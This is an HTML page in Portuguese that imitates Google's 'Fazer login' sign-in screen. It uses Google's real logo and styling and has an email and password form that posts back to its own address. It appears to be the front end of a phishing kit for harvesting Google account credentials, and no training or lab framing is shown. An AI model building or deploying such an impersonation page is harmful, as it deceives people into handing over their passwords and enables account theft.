<!DOCTYPE html>
<html lang="pt">
<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<title>Login - Google</title>
	<style type="text/css">body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f2f2f2;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 350px;
        }
        .login-container img {
            width: 100px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        button:hover {
            background-color: #155ab6;
        }
        .link {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }
        .link:hover {
            text-decoration: underline;
        }
	</style>
</head>
<body>
<div class="login-container"><img alt="Google" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" />
<h2>Fazer login</h2>

<p>Use sua Conta do Google</p>

<form action="" method="POST"><input placeholder="E-mail ou telefone" required="" type="email" /> <input name="password" placeholder="Senha" required="" type="password" /><button type="submit">Pr&oacute;xima</button></form>
<a class="link" href="#">Esqueceu sua senha?</a><br />
<a class="link" href="#">Criar conta</a></div>
</body>
</html>
